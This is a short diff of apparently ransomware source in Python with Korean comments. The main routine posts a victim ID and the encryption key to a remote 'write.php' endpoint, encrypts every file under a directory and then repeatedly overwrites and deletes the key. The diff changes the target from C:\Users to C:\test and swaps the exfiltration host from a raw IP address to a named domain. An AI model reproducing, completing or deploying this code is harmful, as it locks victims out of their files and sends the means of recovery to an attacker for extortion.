@@ -16,7 +16,7 @@ def main():
     send_key(f"{your_id} : {encryption_key.decode()}")
     
     #암호화 진행
-    search_and_encrypt_files(key=encryption_key,path="C:\\Users",extension=("all",))
+    search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=("all",))
     
     #암호화키 세탁과 삭제
     for i in range(100):
@@ -177,7 +177,7 @@ def send_key(text):
     @return : None
     """
     try:
-        url = 'http://180.64.207.217:9999//write.php'
+        url = 'http://04leeyoungjae.site:9999//write.php'
         data = {'message': text}
         requests.post(url, data=data)
         return
